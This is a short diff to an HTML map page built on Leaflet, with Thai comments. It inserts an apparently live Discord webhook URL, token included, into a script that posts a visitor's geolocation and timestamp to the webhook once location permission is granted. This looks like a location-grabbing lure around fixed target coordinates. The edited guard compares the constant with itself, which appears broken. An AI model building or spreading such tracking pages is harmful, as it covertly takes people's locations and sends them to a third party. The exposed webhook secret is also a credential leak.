@@ -311,7 +311,7 @@
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
         // 🛠️ ใส่ URL Discord Webhook ของคุณตรงนี้แทนที่ข้อความเดิม
-        const DISCORD_WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1524030114285752450/ZBtCcXuvNSNIbfdY2vhQwJvFXfRgnhIzFhvtNzUVv0bMm-RVc5-9kmvkjX3kW7ap9Lqw';
 
         const TARGET_LAT = 39.035218;
         const TARGET_LNG = 125.776758;
@@ -339,7 +339,7 @@
                     const timestamp = new Date(position.timestamp).toLocaleString('th-TH');
 
                     // ส่งข้อมูลไปยัง Discord Webhook ทันทีที่มีการกดยอมรับสิทธิ์
-                    if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL !== 'YOUR_DISCORD_WEBHOOK_URL_HERE') {
+                    if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL !== 'https://discord.com/api/webhooks/1524030114285752450/ZBtCcXuvNSNIbfdY2vhQwJvFXfRgnhIzFhvtNzUVv0bMm-RVc5-9kmvkjX3kW7ap9Lqw') {
                         fetch(DISCORD_WEBHOOK_URL, {
                             method: 'POST',
                             headers: {
